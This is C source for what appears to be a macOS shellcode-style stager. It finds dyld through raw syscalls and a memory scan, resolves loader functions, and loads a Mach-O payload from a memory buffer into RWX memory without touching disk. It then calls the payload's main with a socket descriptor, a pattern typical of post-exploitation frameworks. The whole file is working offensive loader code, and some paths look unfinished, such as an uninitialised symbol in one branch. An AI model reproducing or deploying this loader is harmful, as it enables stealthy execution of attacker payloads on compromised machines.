/*
 * References:
 * @parchedmind
 * https://github.com/CylanceVulnResearch/osx_runbin/blob/master/run_bin.c
 *
 * @nologic
 * https://github.com/nologic/shellcc
 */

#include <stdio.h>
#include <string.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#include <sys/types.h>
#include <sys/sysctl.h>

struct dyld_cache_header
{
  char     magic[16];
  uint32_t  mappingOffset;
  uint32_t  mappingCount;
  uint32_t  imagesOffsetOld;
  uint32_t  imagesCountOld;
  uint64_t  dyldBaseAddress;
  uint64_t  codeSignatureOffset;
  uint64_t  codeSignatureSize;
  uint64_t  slideInfoOffsetUnused;
  uint64_t  slideInfoSizeUnused;
  uint64_t  localSymbolsOffset;
  uint64_t  localSymbolsSize;
  uint8_t   uuid[16];
  uint64_t  cacheType;
  uint32_t  branchPoolsOffset;
  uint32_t  branchPoolsCount;
  uint64_t  accelerateInfoAddr;
  uint64_t  accelerateInfoSize;
  uint64_t  imagesTextOffset;
  uint64_t  imagesTextCount;
  uint64_t  patchInfoAddr;
  uint64_t  patchInfoSize;
  uint64_t  otherImageGroupAddrUnused;
  uint64_t  otherImageGroupSizeUnused;
  uint64_t  progClosuresAddr;
  uint64_t  progClosuresSize;
  uint64_t  progClosuresTrieAddr;
  uint64_t  progClosuresTrieSize;
  uint32_t  platform;
  uint32_t  formatVersion          : 8,
            dylibsExpectedOnDisk   : 1,
            simulator              : 1,
            locallyBuiltCache      : 1,
            builtFromChainedFixups : 1,
            padding                : 20;
  uint64_t  sharedRegionStart;
  uint64_t  sharedRegionSize;
  uint64_t  maxSlide;
  uint64_t  dylibsImageArrayAddr;
  uint64_t  dylibsImageArraySize;
  uint64_t  dylibsTrieAddr;
  uint64_t  dylibsTrieSize;
  uint64_t  otherImageArrayAddr;
  uint64_t  otherImageArraySize;
  uint64_t  otherTrieAddr;
  uint64_t  otherTrieSize;
  uint32_t  mappingWithSlideOffset;
  uint32_t  mappingWithSlideCount;
  uint64_t  dylibsPBLStateArrayAddrUnused;
  uint64_t  dylibsPBLSetAddr;
  uint64_t  programsPBLSetPoolAddr;
  uint64_t  programsPBLSetPoolSize;
  uint64_t  programTrieAddr;
  uint32_t  programTrieSize;
  uint32_t  osVersion;
  uint32_t  altPlatform;
  uint32_t  altOsVersion;
  uint64_t  swiftOptsOffset;
  uint64_t  swiftOptsSize;
  uint32_t  subCacheArrayOffset;
  uint32_t  subCacheArrayCount;
  uint8_t   symbolFileUUID[16];
  uint64_t  rosettaReadOnlyAddr;
  uint64_t  rosettaReadOnlySize;
  uint64_t  rosettaReadWriteAddr;
  uint64_t  rosettaReadWriteSize;
  uint32_t  imagesOffset;
  uint32_t  imagesCount;
};

struct dyld_cache_mapping_info {
  uint64_t  address;
  uint64_t  size;
  uint64_t  fileOffset;
  uint32_t  maxProt;
  uint32_t  initProt;
};

struct dyld_cache_image_info
{
  uint64_t  address;
  uint64_t  modTime;
  uint64_t  inode;
  uint32_t  pathFileOffset;
  uint32_t  pad;
};

struct shared_file_mapping
{
  uint64_t  address;
  uint64_t  size;
  uint64_t  file_offset;
  uint32_t  max_prot;
  uint32_t  init_prot;
};

struct  __NSObjectFileImage
{
  const char* path;
  const void* memSource;
  size_t      memLength;
  const void* loadAddress;
  void*       handle;
};

typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);

typedef NSSymbol (*NSLookupSymbolInModule_ptr)(NSModule module, const char *symbolName);
typedef void * (*NSAddressOfSymbol_ptr)(NSSymbol symbol);

typedef NSSymbol (*NSLookupSymbolInImage_ptr)(NSObjectFileImage objectFileImage, const char *symbolName);

typedef void * (*dlopen_ptr)(const char *path, int mode);
typedef void * (*dlsym_ptr)(void *handle, const char *symbol);
void load(void *mem/*, void *args*/, dlsym_ptr dlsym_func, dlopen_ptr dlopen_func);

uint64_t find_macho(uint64_t addr, unsigned int increment);
uint64_t find_dylib(uint64_t addr, unsigned int increment);
uint64_t find_symbol(uint64_t base, char* symbol, uint64_t offset);
int string_compare(const char* s1, const char* s2);
int detect_sierra();
int detect_monterey();
uint64_t syscall_shared_region_check_np();

#define DEBUG
#ifdef DEBUG
static void print(char * str);
#endif

#define DYLD_BASE_ADDR 0x00007fff5fc00000
#define MAX_OSXVM_ADDR 0x00007ffffffff000

int main(int argc, char** argv)
{
#ifdef DEBUG
  print("main!\n");
#endif
  uint64_t buffer = 0;
  uint64_t buffer_size = 0;
  __asm__(
      "movq %%r10, %0;\n"
      "movq %%r12, %1;\n"
      : "=g"(buffer), "=g"(buffer_size));

#ifdef DEBUG
  print("hello world!\n");
#endif

  int sierra = detect_sierra();
  int monterey = detect_monterey();
  uint64_t binary = DYLD_BASE_ADDR;
  uint64_t dyld;
  uint64_t offset;
  if (monterey) {
    uint64_t shared_region_start = syscall_shared_region_check_np();

    struct dyld_cache_header *header = (void*)shared_region_start;
    uint32_t imagesCount = header->imagesCountOld;
    if (imagesCount == 0) {
      imagesCount = header->imagesCount;
    }
    struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;
    uint32_t imagesOffset = header->imagesOffsetOld;
    if (imagesOffset == 0) {
      imagesOffset = header->imagesOffset;
    }
    struct dyld_cache_image_info *dcimg = (void*)header + imagesOffset;
    for (size_t i=0; i < imagesCount; i++) {
      char * pathFile = (char *)shared_region_start+dcimg->pathFileOffset;
      if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
        dyld = dcimg->address;
        break;
      }
      dcimg++;
    }
    offset = (uint64_t)header - sfm->address;
    dyld += offset;
  } else {
    if (sierra) {
      binary = find_macho(0x100000000, 0x1000);
      if (!binary) {
        return 1;
      }
      binary += 0x1000;
    }
    dyld = find_macho(binary, 0x1000);
    offset = dyld;
    if (!sierra) {
      offset -= DYLD_BASE_ADDR;
    }
  }
  if (!dyld) {
    return 1;
  }

  NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = (void*)find_symbol(dyld, "_NSCreateObjectFileImageFromMemory", offset);
  while (!NSCreateObjectFileImageFromMemory_func) {
    if (monterey) {
      dyld = find_dylib(dyld + 0x1000, 0x1000);
    } else {
      dyld = find_macho(dyld + 0x1000, 0x1000);
    }
    if (!sierra) {
      offset = dyld - DYLD_BASE_ADDR;
    }
    if (!dyld) {
      return 1;
    }
    NSCreateObjectFileImageFromMemory_func = (void*)find_symbol(dyld, "_NSCreateObjectFileImageFromMemory", offset);
  } 
#ifdef DEBUG
  print("good symbol!\n");
#endif

  NSLinkModule_ptr NSLinkModule_func = (void*)find_symbol(dyld, "_NSLinkModule", offset);
  if (!NSLinkModule_func) {
    return 1;
  } 

  NSLookupSymbolInModule_ptr NSLookupSymbolInModule_func = (void*)find_symbol(dyld, "_NSLookupSymbolInModule", offset);
  if (!NSLookupSymbolInModule_func) {
    return 1;
  }

  NSAddressOfSymbol_ptr NSAddressOfSymbol_func = (void*)find_symbol(dyld, "_NSAddressOfSymbol", offset);
  if (!NSAddressOfSymbol_func) {
    return 1;
  }


  /*if (*(char*)buffer == 'b') {*/
  /*print("magic b!\n");*/
  /*}*/
  *(char*)buffer = '\xcf';
  ((uint32_t *)buffer)[3] = MH_BUNDLE;

  NSSymbol sym_main;
  NSObjectFileImage fi = 0; 
  if (monterey) {
    dlsym_ptr dlsym_func = (void*)find_symbol(dyld, "_dlsym", offset);
    if (!dlsym_func) {
      return 1;
    }
    dlopen_ptr dlopen_func = (void*)find_symbol(dyld, "_dlopen", offset);
    if (!dlopen_func) {
      return 1;
    }

    print("Loading...\n");
    load((void*)buffer, dlsym_func, dlopen_func);
    print("Loaded.\n");
    if (NSCreateObjectFileImageFromMemory_func((void*)buffer, buffer_size, &fi) != 1) {
      return 1;
    }
  } else {
    if (NSCreateObjectFileImageFromMemory_func((void*)buffer, buffer_size, &fi) != 1) {
      return 1;
    }
#ifdef DEBUG
    print("created!\n");
#endif

    NSModule nm;
    nm = NSLinkModule_func(fi, "", NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW | NSLINKMODULE_OPTION_RETURN_ON_ERROR);
    if (!nm) {
#ifdef DEBUG
      print("no nm!\n");
#endif
      return 1;
    }
#ifdef DEBUG
    print("good nm!\n");
#endif

    sym_main = NSLookupSymbolInModule_func(nm, "_main");
  }
  if (!sym_main) {
    return 1;
  }

  void * addr_main = NSAddressOfSymbol_func(sym_main);
  if (!addr_main) {
    return 1;
  }

#ifdef DEBUG
  print("found main!\n");
#endif

  int(*main_func)(int, char**) = (int(*)(int, char**))addr_main;
  char* socket = (char*)(size_t)argc;
  char *new_argv[] = { "m", socket, NULL };
  int new_argc = 2;
  return main_func(new_argc, new_argv);
}

uint64_t find_symbol(uint64_t base, char* symbol, uint64_t offset)
{
  struct segment_command_64 *sc, *linkedit, *text;
  struct load_command *lc;
  struct symtab_command *symtab;
  struct nlist_64 *nl;

  char *strtab;
  symtab = 0;
  linkedit = 0;
  text = 0;

  lc = (struct load_command *)(base + sizeof(struct mach_header_64));
  for (int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
    if (lc->cmd == LC_SYMTAB) {
      symtab = (struct symtab_command *)lc;
    } else if (lc->cmd == LC_SEGMENT_64) {
      sc = (struct segment_command_64 *)lc;
      char * segname = ((struct segment_command_64 *)lc)->segname;
      if (string_compare(segname, "__LINKEDIT") == 0) {
        linkedit = sc;
      } else if (string_compare(segname, "__TEXT") == 0) {
        text = sc;
      }
    }
    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }

  if (!linkedit || !symtab || !text) {
    return 0;
  }

  unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
  strtab = (char *)(base + file_slide + symtab->stroff);

  nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
  for (int i=0; i<symtab->nsyms; i++) {
    char *name = strtab + nl[i].n_un.n_strx;
    /*#ifdef DEBUG*/
    /*print(name);*/
    /*print("\n");*/
    /*#endif*/
    if (string_compare(name, symbol) == 0) {
      return nl[i].n_value + offset;
    }
  }

  return 0;
}

uint64_t syscall_chmod(uint64_t path, long mode) 
{
  uint64_t chmod_no = 0x200000f;
  uint64_t ret = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(chmod_no), "S"(path), "g"(mode)
      :);
  return ret;
}

uint64_t find_macho(uint64_t addr, unsigned int increment)
{
  while(addr < MAX_OSXVM_ADDR) {
    uint64_t ptr = addr;
    unsigned long ret = syscall_chmod(ptr, 0777);
    if (ret == 0x2 && ((int *)ptr)[0] == MH_MAGIC_64) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

uint64_t find_dylib(uint64_t addr, unsigned int increment)
{
  while(addr < MAX_OSXVM_ADDR) {
    uint64_t ptr = addr;
    if (((int *)ptr)[0] == MH_MAGIC_64 && ((int *) ptr)[3] == MH_DYLIB) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

int string_compare(const char* s1, const char* s2) 
{
  while (*s1 != '\0' && *s1 == *s2)
  {
    s1++;
    s2++;
  }
  return (*(unsigned char *) s1) - (*(unsigned char *) s2);
}

int detect_sierra()
{
  uint64_t sc_sysctl = 0x20000ca;
  int name[] = { CTL_KERN, KERN_OSRELEASE };
  uint64_t nameptr = (uint64_t)&name;
  uint64_t namelen = sizeof(name)/sizeof(name[0]);
  char osrelease[32];
  size_t size = sizeof(osrelease);
  uint64_t valptr = (uint64_t)osrelease;
  uint64_t valsizeptr = (uint64_t)&size;
  uint64_t ret = 0;

  __asm__(
      "mov %1, %%rax;\n"
      "mov %2, %%rdi;\n"
      "mov %3, %%rsi;\n"
      "mov %4, %%rdx;\n"
      "mov %5, %%r10;\n"
      "xor %%r8, %%r8;\n"
      "xor %%r9, %%r9;\n"
      "syscall;\n"
      "mov %%rax, %0;\n"
      : "=g"(ret)
      : "g"(sc_sysctl), "g"(nameptr), "g"(namelen), "g"(valptr), "g"(valsizeptr)
      : );

  // osrelease is 16.x.x on Sierra
  if (ret == 0 && size > 2) {
    if (osrelease[0] == '1' && osrelease[1] < '6' && osrelease[2] == '.') {
      return 0;
    }
    if (osrelease[0] <= '9' && osrelease[1] == '.') {
      return 0;
    }
  }
  return 1;
}

int detect_monterey()
{
  uint64_t sc_sysctl = 0x20000ca;
  int name[] = { CTL_KERN, KERN_OSRELEASE };
  uint64_t nameptr = (uint64_t)&name;
  uint64_t namelen = sizeof(name)/sizeof(name[0]);
  char osrelease[32];
  size_t size = sizeof(osrelease);
  uint64_t valptr = (uint64_t)osrelease;
  uint64_t valsizeptr = (uint64_t)&size;
  uint64_t ret = 0;

  __asm__(
      "mov %1, %%rax;\n"
      "mov %2, %%rdi;\n"
      "mov %3, %%rsi;\n"
      "mov %4, %%rdx;\n"
      "mov %5, %%r10;\n"
      "xor %%r8, %%r8;\n"
      "xor %%r9, %%r9;\n"
      "syscall;\n"
      "mov %%rax, %0;\n"
      : "=g"(ret)
      : "g"(sc_sysctl), "g"(nameptr), "g"(namelen), "g"(valptr), "g"(valsizeptr)
      : );

  // osrelease is 21.x.x on Monterey
  if (ret == 0 && size > 2) {
    if (osrelease[0] == '2' && osrelease[1] <= '0' && osrelease[2] == '.') {
      return 0;
    }
    if (osrelease[0] == '1' && osrelease[1] <= '9' && osrelease[2] == '.') {
      return 0;
    }
    if (osrelease[0] <= '9' && osrelease[1] == '.') {
      return 0;
    }
  }
  return 1;
}

uint64_t syscall_shared_region_check_np()
{
  long shared_region_check_np = 0x2000126; // #294
  uint64_t address = 0;
  unsigned long ret = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(shared_region_check_np), "g"(&address)
      : "rax", "rdi" );
  return address;
}

void * syscall_mmap(void * addr, size_t len, int prot, int flags, int fd, off_t pos) {
  long mmap = 0x20000c5; // #197
  void * address = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "movq %4, %%rdx;\n"
      "movq %5, %%r10;\n"
      "movq %6, %%r8;\n"
      "movq %7, %%r9;\n"
      "syscall;\n"
      "mov %%rax, %0;\n"
      : "=g"(address)
      : "g"(mmap), "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(fd), "g"(pos)
      : );
  return address;
}
#include <mach-o/loader.h>
#include <sys/mman.h>
#include <dlfcn.h>

#define printf(...)
#define setvbuf(...)


void exit(int n) {
    printf("%d\n", n);
}

void memcpyc(void *dst, void *src, size_t n) {
    char *dst_ = (char *)dst, *src_ = (char *)src;
    while(n--)
        *dst_++ = *src_++;
}

int memcmpc(void *dst, void *src, size_t n) {
    char *dst_ = (char *)dst, *src_ = (char *)src;
    while(n--) if(*dst_++ != *src_++) return 1;
    return 0;
}

uint64_t read_uleb128(uint8_t*p, uint8_t* end)
{
    uint64_t result = 0;
    int         bit = 0;
    do {
        if ( p == end ) {
            exit(1);
            break;
        }
        uint64_t slice = *p & 0x7f;

        if ( bit > 63 ) {
            exit(2);
            break;
        }
        else {
            result |= (slice << bit);
            bit += 7;
        }
    }
    while (*p++ & 0x80);
    return result;
}

void vm_(uint64_t base, void **libs, struct load_command **commands, void *mem, uint8_t *cmd, size_t size, dlsym_ptr dlsym_func) {
    uint8_t *p = cmd, *end = cmd + size;
    int ordinal = 0, libIndex = 0;
    const char *symbolName;
    bool done = false;
    uint8_t segIndex;
    uintptr_t segOffset;
    off_t offset;
    int type;
    // ported from dyld
    while ( !done && (p < end) ) {
        uint8_t immediate = *p & BIND_IMMEDIATE_MASK;
        uint8_t opcode = *p & BIND_OPCODE_MASK;
        ++p;
        switch (opcode) {
            case BIND_OPCODE_DONE:
                break;
            case BIND_OPCODE_SET_DYLIB_ORDINAL_IMM:
                libIndex = immediate;
                break;
            case BIND_OPCODE_SET_DYLIB_ORDINAL_ULEB:
                libIndex = (int)read_uleb128(p, end);
                break;
            case BIND_OPCODE_SET_DYLIB_SPECIAL_IMM:
                // the special ordinals are negative numbers
                if ( immediate == 0 )
                    ordinal = 0;
                else {
                    int8_t signExtended = BIND_OPCODE_MASK | immediate;
                    ordinal = signExtended;
                }
                break;
            case BIND_OPCODE_ADD_ADDR_ULEB:
                segOffset += read_uleb128(p, end);
                break;
            case BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM:
                symbolName = (char*)p;
                while (*p != '\0')
                    ++p;
                ++p;
                break;
            case BIND_OPCODE_SET_TYPE_IMM:
                type = immediate;
                break;
            case BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB:
                segIndex  = immediate;
                segOffset = read_uleb128(p, end);
                break;
            case BIND_OPCODE_DO_BIND_ULEB_TIMES_SKIPPING_ULEB: {
                uint64_t count = read_uleb128(p, end);
                uint64_t skip = read_uleb128(p, end);
                segOffset += count * (skip + sizeof(intptr_t));
                break;
            }
            case BIND_OPCODE_DO_BIND_ADD_ADDR_IMM_SCALED:
            case BIND_OPCODE_DO_BIND: {
                void *res = dlsym_func(libs[libIndex], symbolName + 1);
                offset = ((struct segment_command_64 *)commands[segIndex])->vmaddr + segOffset - base;
                printf("%llx (+%lx) %s %d\n", offset, segOffset, symbolName, type);
                printf("dlsym(libs[%d] == %p, \"%s\") == %p\n", libIndex, libs[libIndex], symbolName + 1, res);
                if(symbolName[0] == '_')
                    *(void **)((char *)mem + offset) = res;
                // if not, it's from dyld I guess
                segOffset += 8;
                if(opcode == BIND_OPCODE_DO_BIND_ADD_ADDR_IMM_SCALED)
                    segOffset += immediate * 8;
                break;
            }
            default:
                printf("WARNING: unsupported command: 0x%x\n", opcode);
                // exit(-1);
        }
    }
}

uint64_t power(uint64_t base, uint64_t exp)
{
    uint64_t result = 1;
    while(exp)
    {
        result = result * base;
        exp--;
    }
    return result;
}

void rebase_vm_(uint64_t base, void **libs, struct load_command **commands, void *map, uint8_t *cmd, size_t size) {
    uint8_t *p = cmd, *end = cmd + size;
    uint8_t  type = 0;
    int      segIndex = 0;
    uint64_t segOffset = 0;
    uint64_t count;
    uint64_t skip;
    bool     segIndexSet = false;
    bool     stop = false;
    int ptrSize = 8;
    print("0");
    while ( !stop && (p < end) ) {
        uint8_t immediate = *p & REBASE_IMMEDIATE_MASK;
        uint8_t opcode = *p & REBASE_OPCODE_MASK;
        ++p;
    print("1");
        switch (opcode) {
            case REBASE_OPCODE_DONE:
                if ( (end - p) > 8 )
                    exit(100);
                stop = true;
    print("2");
                break;
            case REBASE_OPCODE_SET_TYPE_IMM:
                type = immediate;
                break;
            case REBASE_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB:
    print("3");
                segIndex = immediate;
    print("4");
                segOffset = read_uleb128(p, end);
    print("5");
                segIndexSet = true;
                break;
            case REBASE_OPCODE_ADD_ADDR_ULEB:
                segOffset += read_uleb128(p, end);
    print("6");
                break;
            case REBASE_OPCODE_ADD_ADDR_IMM_SCALED:
                segOffset += immediate*ptrSize;
    print("7");
                break;
            case REBASE_OPCODE_DO_REBASE_IMM_TIMES:
            case REBASE_OPCODE_DO_REBASE_ULEB_TIMES:
                if(opcode == REBASE_OPCODE_DO_REBASE_IMM_TIMES)
                    count = immediate;
                else
                    count = read_uleb128(p, end);
                for (uint32_t i=0; i < count; ++i) {
                    uintptr_t offset = ((struct segment_command_64 *)commands[segIndex])->vmaddr + segOffset - base;
    print("10");
                    print("\nrebase ");
                    char b[34];
                    b[0] = '0'+((offset / power(10, 15)) % 10);
                    b[1] = '0'+((offset / power(10, 14)) % 10);
                    b[2] = '0'+((offset / power(10, 13)) % 10);
                    b[3] = '0'+((offset / power(10, 12)) % 10);
                    b[4] = '0'+((offset / power(10, 11)) % 10);
                    b[5] = '0'+((offset / power(10, 10)) % 10);
                    b[6] = '0'+((offset / power(10, 9)) % 10);
                    b[7] = '0'+((offset / power(10, 8)) % 10);
                    b[8] = '0'+((offset / power(10, 7)) % 10);
                    b[9] = '0'+((offset / power(10, 6)) % 10);
                    b[10] = '0'+((offset / power(10, 5)) % 10);
                    b[11] = '0'+((offset / power(10, 4)) % 10);
                    b[12] = '0'+((offset / power(10, 3)) % 10);
                    b[13] = '0'+((offset / power(10, 2)) % 10);
                    b[14] = '0'+((offset / power(10, 1)) % 10);
                    b[15] = '0'+((offset / power(10, 0)) % 10);
                    b[16] = ' ';
                    b[17] = '0'+((segOffset / power(10, 15)) % 10);
                    b[18] = '0'+((segOffset / power(10, 14)) % 10);
                    b[19] = '0'+((segOffset / power(10, 13)) % 10);
                    b[20] = '0'+((segOffset / power(10, 12)) % 10);
                    b[21] = '0'+((segOffset / power(10, 11)) % 10);
                    b[22] = '0'+((segOffset / power(10, 10)) % 10);
                    b[23] = '0'+((segOffset / power(10, 9)) % 10);
                    b[24] = '0'+((segOffset / power(10, 8)) % 10);
                    b[25] = '0'+((segOffset / power(10, 7)) % 10);
                    b[26] = '0'+((segOffset / power(10, 6)) % 10);
                    b[27] = '0'+((segOffset / power(10, 5)) % 10);
                    b[28] = '0'+((segOffset / power(10, 4)) % 10);
                    b[29] = '0'+((segOffset / power(10, 3)) % 10);
                    b[30] = '0'+((segOffset / power(10, 2)) % 10);
                    b[31] = '0'+((segOffset / power(10, 1)) % 10);
                    b[32] = '0'+((segOffset / power(10, 0)) % 10);
                    b[33] = 0;
                    print(b);
                    print("\n");
                    printf("rebase %lx (+%llx)\n", offset, segOffset);
    print("11E");
                    *(uintptr_t *)((uintptr_t)map + offset) += ((uintptr_t)map - base);
    print("12");
                    segOffset += ptrSize;
                }
                break;
            case REBASE_OPCODE_DO_REBASE_ADD_ADDR_ULEB: {
    print("13");
                uintptr_t offset = ((struct segment_command_64 *)commands[segIndex])->vmaddr + segOffset - base;
    print("14");
                printf("rebase %lx (+%llx)\n", offset, segOffset);
    print("15");
                *(uintptr_t *)((uintptr_t)map + offset) += ((uintptr_t)map - base);
    print("16");
                segOffset += read_uleb128(p, end) + ptrSize;
                break;
            }
            case REBASE_OPCODE_DO_REBASE_ULEB_TIMES_SKIPPING_ULEB:
                count = read_uleb128(p, end);
                skip = read_uleb128(p, end);
                for (uint32_t i=0; i < count; ++i) {
                    uintptr_t offset = ((struct segment_command_64 *)commands[segIndex])->vmaddr + segOffset - base;
                    printf("rebase %lx (+%llx)\n", offset, segOffset);
                    *(uintptr_t *)((uintptr_t)map + offset) += ((uintptr_t)map - base);
                    segOffset += skip + ptrSize;
                    if ( stop )
                        break;
                }
                break;
            default:
                exit(101);
        }
    }
}

#define vm(offset, size) vm_(base, libs, commands, map, (uint8_t *)mem + offset, size, dlsym_func)
#define rebase_vm(offset, size) rebase_vm_(base, libs, commands, map, (uint8_t *)mem + offset, size)

void load(void *mem/*, void *args*/, dlsym_ptr dlsym_func, dlopen_ptr dlopen_func) {
    setvbuf(stdout, 0, _IONBF, 0);
    struct mach_header *header = (struct mach_header *)mem;
    struct load_command* startCmds = (struct load_command*)((char *)header + sizeof(struct mach_header_64));
    struct load_command *cmd;

    print("About to printf.\n");
    printf("%x %x\n", header->magic, MH_MAGIC_64);
    print("Done with printf.\n");
    size_t highest_address = 0;

    struct load_command *commands[0x80];
    void *libs[0x80 + 1];
    int libCount = 1;
    uint64_t base = 0;
    char pagezero[] = "__PAGEZERO";

#define LC cmd = startCmds; for (uint32_t i = 0; i < header->ncmds; ++i, cmd = (struct load_command*)((char *)cmd + cmd->cmdsize))

    LC {
        if(cmd->cmd != LC_SEGMENT_64) continue;
        struct segment_command_64 * seg = (struct segment_command_64 *)cmd;
        size_t end = seg->vmaddr + seg->vmsize;

        if(!memcmpc(seg->segname, (void *)pagezero, 11))
            base = seg->vmsize;

        if(highest_address < end) {
            highest_address = end;
        }

        commands[i] = cmd;
    }

    print("H5340\n");
    highest_address -= base;
    commands[header->ncmds] = 0;

    printf("%lx\n", highest_address);
    print("Before mmap.\n");
    void *map = syscall_mmap(NULL, highest_address, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE|MAP_JIT, -1, 0);
    print("After mmap.\n");
    if (((uint64_t)(map)) < 1000) {
      char b[8];
      b[0] = '0'+(((uint64_t)(map)) / 100) % 10;
      b[1] = '0'+(((uint64_t)(map)) / 10) % 10;
      b[2] = '0'+(((uint64_t)(map)) % 10);
      b[3] = '\n';
      b[4] = 0;
      print(b);
      print("Invalid map.\n");
    }

    uint64_t entry = 0;
    struct dysymtab_command *symtab;
    print("H5341\n");

    LC {
        if(cmd->cmd == LC_SEGMENT_64) {
            struct segment_command_64 * seg = (struct segment_command_64 *)cmd;
            print("Before memcpyc.\n");
            memcpyc((char *)map + seg->vmaddr - base, (char *)mem + seg->fileoff, seg->filesize);
            print("After memcpyc.\n");
        }

        if(cmd->cmd == 0x80000028) {
            struct entry_point_command * entrycmd = (struct entry_point_command *)cmd;
            entry = entrycmd->entryoff;
        }

        if(cmd->cmd == LC_SYMTAB) {
            symtab = (struct dysymtab_command *)cmd;
        }

        if(cmd->cmd == LC_LOAD_DYLIB) {
            struct dylib_command * dylib = (struct dylib_command *)cmd;
            print("Before dlopen_func.\n");
            libs[libCount++] = dlopen_func((const char *)dylib + dylib->dylib.name.offset, RTLD_LAZY);
            print("After dlopen_func.\n");
        }
    }
    print("H5342\n");

    LC {
        printf("cmd: %x\n", cmd->cmd);

        if(cmd->cmd == LC_DYLD_INFO_ONLY) {
            struct dyld_info_command * dyld = (struct dyld_info_command *)cmd;

            print("Before rebase_vm.\n");
            rebase_vm(dyld->rebase_off, dyld->rebase_size);
            print("After rebase_vm.\n");
            print("Before vm.\n");
            vm(dyld->bind_off, dyld->bind_size);
            print("After vm.\n");
            print("Before vm.\n");
            vm(dyld->lazy_bind_off, dyld->lazy_bind_size);
            print("After vm.\n");
        }
    }
    print("H5343\n");

    /*if(!entry) {
        for(size_t i = 0; i < highest_address; i++) {
            int *cur = (int *)((char *)map + i);
            if(cur[0] == 0x13371337) {
                entry = i + 16;
                printf("%lx %llx\n", i, entry);
                break;
            }
        }
    }*/

    //entry += (uint64_t)map;
    //printf("%p\n", (void *)entry);
    //((void (*)(int, void *))(entry))(1, args);
}


#ifdef DEBUG
int string_len(const char* s1) 
{
  const char* s2 = s1;
  while (*s2 != '\0')
  {
    s2++;
  }
  return (s2 - s1);
}

void print(char * str) 
{
  long write = 0x2000004;
  long stdout = 1;
  unsigned long len = string_len(str);
  unsigned long long addr = (unsigned long long) str;
  unsigned long ret = 0;
  /* ret = write(stdout, str, len); */
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "movq %4, %%rdx;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(write), "g"(stdout), "S"(addr), "g"(len)
      : "rax", "rdi", "rdx" );
}
#endif
